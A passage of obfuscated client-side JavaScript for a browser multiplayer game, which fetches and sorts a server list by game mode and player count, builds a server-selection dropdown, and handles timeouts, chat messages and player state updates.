		function ᐃΔᐃᐃⲆΔⵠⲆⲆ() {
			var ᐃᐃᐃ = this;
			this.ΔⲆⲆΔ = null;
			this.ΔⲆⲆᐃⲆ = 0;
			this.ΔΔⲆΔⲆ = [];
			this.ⵠⵠᐃΔᐃⲆᐃ = {};
			this.ⵠΔⲆΔᐃᐃΔ = {};
			this.ΔᐃⵠΔᐃ = [
				[],
				[],
				[],
				[],
				[],
				[],
				[],
				[],
				[]
			];
			this.ⲆΔⵠⵠⵠΔᐃ = [-1, -ⵠΔᐃ, -1, -1, -1, -ᐃᐃⲆΔ, -1, -ⵠⲆΔ, -ΔⲆⵠ];
			this.ⵠΔⵠⲆΔ = ⵠⲆᐃⵠ;
			this.ⲆⵠⵠⲆⵠᐃΔ = ⵠⲆᐃⵠ;
			this.ⵠⵠᐃⲆⲆⵠⵠ = function(ΔⲆⵠᐃΔⵠΔ) {
				if (ᐃⵠᐃⵠᐃ !== ΔΔⵠΔᐃ) {
					ᐃᐃᐃ.ΔΔⲆΔⲆ.push({
						a: ΔΔⵠΔᐃ[ⵠ[163]],
						gm: ΔΔⵠΔᐃ["mode"],
						idx: ⲆΔⵠ,
						m: 100,
						nu: ⲆΔⵠ,
						id: ⵠΔⲆⵠ
					});
					ΔⲆⵠᐃΔⵠΔ();
					return
				}
				fetch(ᐃΔⵠⵠⵠᐃΔ + "/list", {
					method: ⵠ[526]
				}).then((function(ᐃᐃᐃⲆᐃᐃᐃ) {
					if (!ᐃᐃᐃⲆᐃᐃᐃ.ok) {
						ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]]((function() {
							ᐃᐃᐃ.ⵠⵠᐃⲆⲆⵠⵠ(ΔⲆⵠᐃΔⵠΔ)
						}), 3e3);
						return
					}
					ᐃᐃᐃⲆᐃᐃᐃ.json().then((function(ΔΔᐃⲆᐃⲆᐃ) {
						ᐃᐃᐃ.ΔΔⲆΔⲆ = [];
						ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ = {};
						for (let ᐃᐃⲆⲆΔ in ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ) {
							const ⵠΔΔᐃⲆᐃΔⵠᐃ = ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ[ᐃᐃⲆⲆΔ];
							ᐃᐃᐃ.ΔΔⲆΔⲆ.push({
								a: "Auto Select",
								gm: ⵠΔΔᐃⲆᐃΔⵠᐃ,
								m: 100,
								nu: 0,
								auto: ΔᐃⲆⵠⵠ
							})
						}
						var ᐃⵠΔⵠᐃⵠΔ = 0;
						var ⲆᐃΔᐃᐃᐃⲆ = ᐃⲆᐃ;
						var ⵠᐃⵠⲆⵠⲆΔ = 2;
						var ⲆᐃΔⵠΔᐃⲆⵠᐃ = 3;
						var ΔⵠⵠΔⲆⵠⲆΔᐃ = 4;
						var ᐃⵠᐃΔᐃⲆᐃⲆΔ = 5;
						for (let ⵠᐃ = 0; ΔΔᐃⲆᐃⲆᐃ.length > ⵠᐃ; ⵠᐃ++) {
							const ᐃᐃᐃⲆ = ΔΔᐃⲆᐃⲆᐃ[ⵠᐃ];
							const ΔΔⲆⵠⵠ = ᐃᐃᐃⲆ["n"];
							const ᐃΔⵠⵠᐃ = ᐃᐃᐃⲆ["l"];
							const ⲆΔΔⵠⵠⲆΔ = ᐃᐃᐃⲆ["p"];
							const ⵠⵠᐃΔᐃⲆᐃ = [];
							ᐃᐃᐃ.ⵠⵠᐃΔᐃⲆᐃ[ΔΔⲆⵠⵠ] = ⵠⵠᐃΔᐃⲆᐃ;
							const ⵠⵠᐃⲆⲆⵠᐃ = [];
							for (let ᐃⵠᐃⵠ = ᐃⵠⲆⵠ; ᐃⵠᐃⵠ < ⲆΔΔⵠⵠⲆΔ.length; ᐃⵠᐃⵠ++) {
								const ⲆΔᐃⲆⵠΔᐃ = ⲆΔΔⵠⵠⲆΔ[ᐃⵠᐃⵠ];
								const ⵠⲆⲆΔⵠᐃⲆ = ΔΔⲆⵠⵠ + ⲆΔᐃⲆⵠΔᐃ[ᐃⵠΔⵠᐃⵠΔ];
								ⵠⵠᐃⲆⲆⵠᐃ.push(ⵠⲆⲆΔⵠᐃⲆ);
								ⵠⵠᐃΔᐃⲆᐃ.push(ⵠⲆⲆΔⵠᐃⲆ)
							}
							for (let ᐃⵠᐃⵠ = Δᐃᐃᐃ; ᐃΔⵠⵠᐃ.length > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
								const Ⲇᐃⵠᐃᐃ = ᐃΔⵠⵠᐃ[ᐃⵠᐃⵠ];
								let ⵠⵠⲆⵠΔⲆⲆ = ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ[Ⲇᐃⵠᐃᐃ[ⵠᐃⵠⲆⵠⲆΔ]];
								let ⲆⵠⲆⲆᐃᐃΔ = ⵠⵠⲆⵠΔⲆⲆ + Ⲇᐃⵠᐃᐃ[ⲆᐃΔᐃᐃᐃⲆ];
								let ⲆⲆΔᐃⲆᐃⲆ;
								ⵠⵠⲆⵠΔⲆⲆ in ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ ? ⲆⲆΔᐃⲆᐃⲆ = ++ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ[ⵠⵠⲆⵠΔⲆⲆ] : ⲆⲆΔᐃⲆᐃⲆ = ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ[ⵠⵠⲆⵠΔⲆⲆ] = 1;
								if (ⲆⵠⲆⲆᐃᐃΔ in ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ) ᐃⵠᐃΔᐃⲆΔ = ++ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ[ⲆⵠⲆⲆᐃᐃΔ];
								else ᐃⵠᐃΔᐃⲆΔ = ᐃᐃᐃ.ⵠΔⲆΔᐃᐃΔ[ⲆⵠⲆⲆᐃᐃΔ] = ΔⵠΔⵠ;
								ᐃᐃᐃ.ΔΔⲆΔⲆ.push({
									name: Ⲇᐃⵠᐃᐃ[ΔⵠⵠΔⲆⵠⲆΔᐃ],
									a: ΔᐃᐃΔ.ⲆⵠΔΔᐃⲆⵠᐃⵠ[Ⲇᐃⵠᐃᐃ[ⲆᐃΔᐃᐃᐃⲆ]] + " " + ᐃⵠᐃΔᐃⲆΔ,
									r: Ⲇᐃⵠᐃᐃ[ⲆᐃΔᐃᐃᐃⲆ],
									gm: ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ[Ⲇᐃⵠᐃᐃ[ⵠᐃⵠⲆⵠⲆΔ]],
									idx: ⲆⲆΔᐃⲆᐃⲆ,
									m: 100,
									nu: Ⲇᐃⵠᐃᐃ[ⲆᐃΔⵠΔᐃⲆⵠᐃ],
									id: Ⲇᐃⵠᐃᐃ[ⲆᐃΔᐃᐃᐃⲆ] + Ⲇᐃⵠᐃᐃ[ᐃⵠΔⵠᐃⵠΔ],
									p: ⵠⵠᐃⲆⲆⵠᐃ
								})
							}
						}
						const ᐃΔⲆⲆⲆⲆⵠ = [];
						const ΔΔⲆⵠᐃᐃⲆ = [];
						const ΔᐃⲆΔⵠΔᐃ = [];
						for (let ⵠᐃ = ᐃΔΔ; ⵠᐃ < ᐃᐃᐃ.ΔΔⲆΔⲆ.length; ⵠᐃ++) {
							const Ⲇᐃⵠᐃᐃ = ᐃᐃᐃ.ΔΔⲆΔⲆ[ⵠᐃ];
							if (Ⲇᐃⵠᐃᐃ["auto"]) continue;
							if (ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ[ΔᐃᐃΔ.ᐃⲆΔⵠⵠ] !== Ⲇᐃⵠᐃᐃ[ⵠ[454]]) continue;
							if (typeof Ⲇᐃⵠᐃᐃ.name === ⵠ[360] && (-1 !== Ⲇᐃⵠᐃᐃ.name.indexOf("Private Server") || Ⲇᐃⵠᐃᐃ[ⵠ[158]] > 95)) ΔᐃⲆΔⵠΔᐃ.push(Ⲇᐃⵠᐃᐃ);
							else ΔΔⲆⵠᐃᐃⲆ.push(Ⲇᐃⵠᐃᐃ);
							ᐃΔⲆⲆⲆⲆⵠ.push(ⵠᐃ)
						}
						const ΔⵠⲆᐃⲆᐃⵠ = [];
						ΔⵠⲆᐃⲆᐃⵠ.push(...ΔΔⲆⵠᐃᐃⲆ.sort((function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
							return ⲆᐃΔⲆ[ⵠ[158]] - ⲆⲆᐃⲆ[ⵠ[158]]
						})));
						ΔⵠⲆᐃⲆᐃⵠ.push(...ΔᐃⲆΔⵠΔᐃ.sort((function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
							const ᐃᐃⵠⵠⲆᐃᐃⵠⲆ = ⲆᐃΔⲆ[ⵠ[158]] < 95 ? ⲆᐃΔⲆ[ⵠ[158]] : 0;
							const ⵠΔΔⲆⵠᐃⵠⲆᐃ = ⲆⲆᐃⲆ[ⵠ[158]] < 95 ? ⲆⲆᐃⲆ[ⵠ[158]] : 0;
							return ᐃᐃⵠⵠⲆᐃᐃⵠⲆ - ⵠΔΔⲆⵠᐃⵠⲆᐃ
						})));
						for (let ⵠᐃ = 0; ⵠᐃ < ᐃΔⲆⲆⲆⲆⵠ.length; ⵠᐃ++) {
							const ⵠⵠᐃᐃΔᐃⵠ = ᐃΔⲆⲆⲆⲆⵠ[ⵠᐃ];
							const Ⲇᐃⵠᐃᐃ = ΔⵠⲆᐃⲆᐃⵠ[ⵠᐃ];
							Ⲇᐃⵠᐃᐃ["idx"] = ⵠᐃ + ⵠΔᐃ;
							ᐃᐃᐃ.ΔΔⲆΔⲆ[ⵠⵠᐃᐃΔᐃⵠ] = Ⲇᐃⵠᐃᐃ
						}
						ΔⲆⵠᐃΔⵠΔ()
					}))
				}))
			};
			this.ᐃᐃⲆΔᐃᐃⲆᐃᐃ = function(ᐃᐃᐃⲆ) {
				var Δⵠⵠᐃⵠ = [];
				for (var ⵠᐃ = Ⲇᐃⵠⵠ; ᐃᐃᐃⲆ.length > ⵠᐃ; ⵠᐃ++) {
					-1 !== ᐃᐃᐃⲆ[ⵠᐃ]["a"].indexOf(ⲆᐃΔΔΔ) && Δⵠⵠᐃⵠ.push(ⵠᐃ)
				}
				if (0 === Δⵠⵠᐃⵠ.length) return ⵠᐃⲆᐃ;
				return Δⵠⵠᐃⵠ[Math.floor(Math.random() * Δⵠⵠᐃⵠ.length)]
			};

			function ⲆᐃΔᐃΔΔᐃ(Ⲇᐃⵠᐃᐃ) {
				let name = Ⲇᐃⵠᐃᐃ[ⵠ[163]] || Ⲇᐃⵠᐃᐃ["a"];
				if (Ⲇᐃⵠᐃᐃ["auto"]) return name;
				return name + " [" + Ⲇᐃⵠᐃᐃ[ⵠ[158]] + " " + ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] + "]"
			}
			this.ΔᐃⲆⲆΔΔⵠ = function(ᐃᐃᐃⲆ) {
				var ΔᐃΔΔΔⲆⵠ = Δᐃᐃᐃ;
				for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃᐃⲆ.length; ⵠᐃ++) ΔᐃΔΔΔⲆⵠ += ᐃᐃᐃⲆ[ⵠᐃ][ⵠ[158]];
				var ΔⲆⲆᐃⵠ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]);
				ΔⵠⲆᐃ.ⲆΔⵠⵠⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ] === -ⵠΔᐃ ? ΔⵠⲆᐃ.ⲆΔⵠⵠⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ] = ΔⲆⲆᐃⵠ.selectedIndex = ΔⵠⲆᐃ.ᐃᐃⲆΔᐃᐃⲆᐃᐃ(ᐃᐃᐃⲆ) : ΔⲆⲆᐃⵠ.selectedIndex = ΔⵠⲆᐃ.ⲆΔⵠⵠⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ];
				var ᐃᐃⵠᐃ = '<label for="ul-id"><button type="button" class="ng-binding">' + ᐃᐃᐃⲆ[ΔⲆⲆᐃⵠ.selectedIndex]["a"] + (ᐃᐃᐃⲆ[ΔⲆⲆᐃⵠ.selectedIndex][ⵠ[158]] > 0 ? " [" + ᐃᐃᐃⲆ[ΔⲆⲆᐃⵠ.selectedIndex][ⵠ[158]] + " " + ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] + "]" : "") + "</button></label>" + '<ul role="listbox" id="ul-id" class="md-whiteframe-z1" name="ul-id">' + '<li role="option" id="selectDisabled">' + ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] + " (" + this.ᐃⵠⵠⲆᐃⵠᐃ + ") " + ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] + "</li>";
				for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃᐃⲆ.length; ⵠᐃ++) ᐃᐃⵠᐃ += '<li role="option">' + ⲆᐃΔᐃΔΔᐃ(ᐃᐃᐃⲆ[ⵠᐃ]) + "</li>\n";
				ᐃᐃⵠᐃ += '<li role="option" id="selectDisabled">(' + ΔᐃΔΔΔⲆⵠ + ") " + ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] + "</li>";
				ᐃᐃⵠᐃ += ⵠ[123];
				ΔⲆⲆᐃⵠ[ΔᐃⲆⵠⲆⵠΔ[290]] = ᐃᐃⵠᐃ;
				$(".md-select").on(ⵠ[316], (function() {
					$(this).toggleClass(ⵠ[29])
				}));
				$(".md-select ul li").on(ⵠ[316], (function() {
					var ΔᐃΔ = $(this).text();
					var ᐃΔ = -ᐃⲆᐃ;
					var ΔᐃΔΔᐃⵠΔ = ΔⵠⲆᐃ.ΔᐃⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ];
					for (var ⵠᐃ = 0; ⵠᐃ < ΔᐃΔΔᐃⵠΔ.length; ⵠᐃ++) {
						const name = ⲆᐃΔᐃΔΔᐃ(ΔᐃΔΔᐃⵠΔ[ⵠᐃ]);
						if (name === ΔᐃΔ) {
							ᐃΔ = ⵠᐃ;
							break
						}
					}
					if (ᐃΔ === -1) return;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]).selectedIndex = ᐃΔ;
					ΔⵠⲆᐃ.ⲆΔⵠⵠⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ] = ᐃΔ;
					$(".md-select ul li").removeClass(ⵠ[29]);
					$(this).addClass(ⵠ[29]);
					$(".md-select label button").text(ΔᐃΔ)
				}))
			};
			this.ᐃⵠⵠⲆᐃⵠᐃ = ⵠΔⲆⵠ;
			this.ᐃᐃᐃⵠⵠᐃⵠᐃⵠ = function() {
				this.ᐃⵠⵠⲆᐃⵠᐃ = 0;
				for (var ⵠᐃ = 0; ⵠᐃ < ΔⵠⲆᐃ.ΔΔⲆΔⲆ.length; ⵠᐃ++) {
					if (this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]] == "experimental") this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else if (this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]] == "zombies") this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else if ("community" == this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]]) this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ᐃⲆΔⵠⵠ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else if (ⵠ[423] == this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]]) this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else if ("battle-royale" == this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]]) this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else if (this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[454]] == "vampires") this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⲆⵠΔⵠᐃ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					else this.ΔᐃⵠΔᐃ[ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ].push(this.ΔΔⲆΔⲆ[ⵠᐃ]);
					this.ᐃⵠⵠⲆᐃⵠᐃ += this.ΔΔⲆΔⲆ[ⵠᐃ][ⵠ[158]]
				}
				for (ⵠᐃ = 0; ⵠᐃ < this.ΔᐃⵠΔᐃ.length; ⵠᐃ++)
					if (this.ΔᐃⵠΔᐃ[ⵠᐃ].length === 0) this.ΔᐃⵠΔᐃ[ⵠᐃ].push({
						a: ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ],
						"ᐃᐃⲆⵠᐃⲆⵠᐃⵠ": ⵠⲆⲆ,
						"ⵠᐃ": "127.0.0.1",
						"ᐃⲆⲆ": 80
					});
				this.ΔᐃⲆⲆΔΔⵠ(this.ΔᐃⵠΔᐃ[0]);
				this.ᐃⲆΔᐃᐃ = function(ΔᐃΔ) {
					ΔⵠⲆᐃ.ⵠΔⵠⲆΔ = ΔᐃΔ;
					ΔⵠⲆᐃ.ΔᐃⲆⲆΔΔⵠ(ΔⵠⲆᐃ.ΔᐃⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ]);
					ΔⵠⲆᐃ.ΔᐃⲆⲆΔΔⵠ(ΔⵠⲆᐃ.ΔᐃⵠΔᐃ[ΔⵠⲆᐃ.ⵠΔⵠⲆΔ]);
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]).selectedIndex = ΔⵠⲆᐃ.ⵠΔⵠⲆΔ
				}
			};
			this.ΔⵠⵠΔⲆΔⲆ = 0;
			this.ⵠΔⵠⵠᐃᐃⲆ = 0;
			this.ⵠⲆᐃᐃⵠ = null;
			this.timeout = function() {
				ᐃᐃᐃ.ⵠΔⵠⵠᐃᐃⲆ++;
				ᐃᐃᐃ.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[87]]();
				if (ᐃⲆⵠᐃᐃ.ᐃᐃⲆⵠᐃᐃⲆⲆᐃ < ᐃᐃᐃ.ⵠΔⵠⵠᐃᐃⲆ) {
					ⵠᐃⲆⵠⲆΔᐃ = ΔΔᐃⵠ;
					ⵠⲆᐃΔ.ⲆⲆⲆⲆΔⵠⲆᐃΔ = ᐃⲆⵠᐃᐃ.ᐃᐃⵠⲆΔⵠⲆᐃⲆ;
					ᐃᐃᐃ.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ]);
					ⵠⲆᐃΔ.waiting = ᐃᐃⵠΔⵠ;
					if (ᐃᐃΔ.reconnect.enabled) {
						ΔⵠⵠⲆ.ⵠΔΔΔᐃ(ⵠⲆᐃΔ.ⲆΔΔᐃⵠ)
					}
				} else {
					ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ === undefined || ⵠᐃⵠⲆΔ === ᐃᐃΔ.ΔΔᐃⲆᐃⲆⲆ || ᐃᐃΔ.ⲆΔᐃΔⵠΔⲆ === undefined || ᐃᐃΔ.ⲆΔⵠᐃᐃⵠⲆ === undefined ? ⵠⲆᐃΔ.ᐃⲆⲆⲆⲆᐃⵠ((function() {
						ᐃᐃᐃ.ⲆᐃΔΔΔΔⵠ()
					}), ᐃᐃⲆΔ) : ᐃᐃᐃ.ⲆᐃΔΔΔΔⵠ()
				}
			};
			this.ⲆⲆᐃⲆⵠⲆᐃ = function(ΔⵠΔᐃⵠᐃⵠⵠⵠ) {
				if (this.ΔⲆⲆΔ.ΔⲆⲆᐃⲆ != this.ΔⲆⲆᐃⲆ) return;
				this.ΔⲆⲆᐃⲆ++;
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] + ΔⵠΔᐃⵠᐃⵠⵠⵠ);
				ΔⵠⵠⲆ.ⵠΔΔΔᐃ(ⵠⲆᐃΔ.ⲆΔΔᐃⵠ)
			};
			this.ⲆⵠⵠΔᐃⲆᐃⲆⵠ = function() {
				this.ⲆⲆⵠⲆⲆ("You speak too much")
			};
			this.ΔΔⲆⲆᐃⲆᐃⲆᐃ = function() {
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ]);
				ⵠⲆᐃΔ.waiting = ᐃⵠⵠᐃΔ
			};
			this.ΔΔᐃⲆΔⲆΔⵠᐃ = function() {
				ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
			};
			this.ΔΔᐃⲆⲆᐃᐃΔⲆ = function() {
				ΔⵠⵠⲆ.ⵠᐃΔᐃⵠⵠⵠ = 0
			};
			this.ΔᐃᐃⵠⵠⲆⵠᐃΔ = function() {
				ΔⵠⵠⲆ.ΔΔᐃΔⲆΔⵠ = 0
			};
			this.ᐃΔΔΔᐃΔⲆⲆⵠ = function(ⲆⵠᐃᐃΔ) {
				ᐃᐃΔ.ⵠⲆΔᐃⵠ.ⲆⵠᐃᐃΔ = ⲆⵠᐃᐃΔ;
				if (-300 < ⲆⲆⲆ.ᐃᐃⲆΔⲆ) {
					if (0 === ⲆⵠᐃᐃΔ) this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⵠⵠⲆΔᐃⵠᐃ]);
					else this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⲆΔΔᐃ])
				}
			};
			this.ᐃΔⵠⲆᐃ = function(ᐃΔⵠⲆᐃ) {
				ᐃᐃΔ.ᐃΔⵠⲆᐃ = ᐃΔⵠⲆᐃ
			};
			this.ᐃΔⵠᐃᐃⲆⲆΔⲆ = function(Δⵠⵠⵠⵠᐃᐃ) {
				ᐃᐃΔ.Δⵠⵠⵠⵠᐃᐃ = Δⵠⵠⵠⵠᐃᐃ
			};
			this.Δⵠⵠⵠⵠᐃᐃ = function(ⲆⵠᐃᐃΔ) {
				ᐃᐃΔ.ⲆᐃΔⲆΔ.ⲆⵠᐃᐃΔ = ⲆⵠᐃᐃΔ;
				if (-300 < ⲆⲆⲆ.ⵠΔΔⲆΔ) {
					if (ⲆⵠᐃᐃΔ === 0) this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔⲆᐃⵠΔ]);
					else this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠᐃⲆΔΔ])
				}
			};
			this.ΔᐃⵠⵠΔᐃΔⲆⵠ = function(ᐃⲆⲆⵠ) {
				if (ΔᐃΔΔ === ᐃⲆⲆⵠ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreForest").src = "img/forest-leaf-ok.png";
				else if (ᐃⲆⲆⵠ === 1) document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreWinter").src = "img/winter-flake-ok.png";
				else if (ᐃⲆⲆⵠ === 2) document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreLava").src = "img/lava-volcano-ok.png";
				else if (ⵠⵠⵠⵠ === ᐃⲆⲆⵠ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("exploreDesert").src = "img/desert-cactus-ok.png"
			};
			this.ΔⲆⵠⲆᐃΔⵠΔⵠ = function() {
				ΔⵠⵠⲆ.ⲆⲆⲆΔⲆᐃⲆ = 0
			};
			this.ⲆᐃⲆΔⵠⲆᐃᐃΔ = function() {
				ΔⵠⵠⲆ.ᐃΔΔΔⵠᐃⲆ = ΔΔⵠⵠ
			};
			this.ⲆⲆΔⲆᐃΔΔᐃⲆ = function() {
				ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ = [];
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ = [];
				ᐃᐃΔ.ⲆⵠⲆⵠ.id = -ⵠΔⵠΔ;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.stop();
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ = [];
				ᐃᐃΔ.ⵠΔΔⲆ.ⲆΔΔⲆⲆ = false;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃⵠⲆΔⵠΔⵠΔ = ᐃⲆᐃⵠΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = -ⵠΔΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.id = -ⵠΔᐃ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠⵠᐃΔ = ᐃⵠⵠⲆᐃ;
				ᐃᐃΔ.ⵠΔΔⲆ.Ⲇⵠⵠⵠⵠ = ΔᐃᐃⲆⲆ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠᐃⲆΔⲆ = ⲆΔⲆᐃΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃⵠΔᐃᐃΔⵠ = false;
				ᐃᐃΔ.ⵠΔΔⲆ.timeout = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ᐃΔΔ, ΔⲆᐃᐃ, 0, 1, 1)
			};
			this.ᐃⲆΔⲆΔⵠⲆᐃⵠ = function() {
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ();
				ⵠⲆᐃΔ.waiting = false
			};
			this.ⵠⵠⵠᐃⵠⵠⵠ = function(ᐃⲆᐃⵠ) {
				for (var ⵠᐃ = 0; ᐃⲆᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					if (typeof ᐃⲆᐃⵠ[ⵠᐃ] === ⵠ[360]) ᐃⲆᐃⵠ[ⵠᐃ] = ΔΔⲆᐃ.ΔⵠΔⲆᐃⲆᐃ(ᐃⲆᐃⵠ[ⵠᐃ])
				}
				ᐃᐃΔ.ᐃᐃᐃⲆΔ.ΔⲆⵠⵠⵠ(ᐃⲆᐃⵠ[ⵠΔᐃ], ᐃⲆᐃⵠ[ΔⵠᐃⲆ], ᐃⲆᐃⵠ[ⵠⵠⵠⵠ], ᐃⲆᐃⵠ[ᐃⵠⵠΔ])
			};
			this.message = function(ᐃⲆᐃⵠ) {
				this.ⲆⲆⵠⲆⲆ(ᐃⲆᐃⵠ)
			};
			this.ΔⵠⵠⲆΔΔⲆΔⵠ = function() {
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃᐃᐃⲆⵠⲆⲆ]);
				ⵠⲆᐃΔ.waiting = false
			};
			this.ᐃΔΔⵠᐃᐃⲆⲆΔ = function() {
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔⲆΔᐃⲆⲆᐃ]);
				ⵠⲆᐃΔ.waiting = ΔⵠΔⲆΔ
			};
			this.ⲆᐃⲆⲆⲆⲆᐃⲆΔ = function() {
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ]);
				ⵠⲆᐃΔ.waiting = ᐃᐃΔᐃΔ
			};
			this.ΔΔⲆⲆᐃⵠᐃⲆΔ = function() {
				ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠⵠⵠⵠⵠΔⲆ(1, 0);
				ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
			};
			this.ᐃᐃᐃⲆⲆᐃⲆΔⵠ = function(ⲆⲆⲆⵠ) {
				var ᐃΔ = ⲆⲆⲆⵠ[1];
				var ⵠΔⲆΔ = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ];
				ⵠΔⲆΔ.ⲆⵠⲆᐃ = ⲆⲆⲆⵠ[ⵠⵠΔⲆ];
				ⵠΔⲆΔ.Δᐃᐃⵠᐃ = ⲆⲆⲆⵠ[3];
				ⵠΔⲆΔ.ⲆΔⲆⲆⵠⲆΔ = ⲆⲆⲆⵠ[ΔΔⵠⵠΔ];
				ⵠΔⲆΔ.ⵠⲆᐃⵠⵠ = ⲆⲆⲆⵠ[ⲆΔⲆᐃ];
				ⵠΔⲆΔ.ⲆᐃⲆⲆᐃ = ⲆⲆⲆⵠ[6];
				ⵠΔⲆΔ.ᐃⲆⵠΔⵠ = ⲆⲆⲆⵠ[7];
				ⵠΔⲆΔ.level = ⲆⲆⲆⵠ[ⲆⵠⵠⲆΔ];
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃΔ * ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ];
				if (ᐃⲆⲆ) {
					ᐃⲆⲆ.ⲆⵠⲆᐃ = ⲆⲆⲆⵠ[ⲆΔΔⵠ];
					ᐃⲆⲆ.Δᐃᐃⵠᐃ = ⲆⲆⲆⵠ[ⵠⲆΔⵠΔ];
					ᐃⲆⲆ.ⲆΔⲆⲆⵠⲆΔ = ⲆⲆⲆⵠ[ΔᐃⵠⵠⲆ];
					ᐃⲆⲆ.ⵠⲆᐃⵠⵠ = ⲆⲆⲆⵠ[ΔΔᐃⲆ]
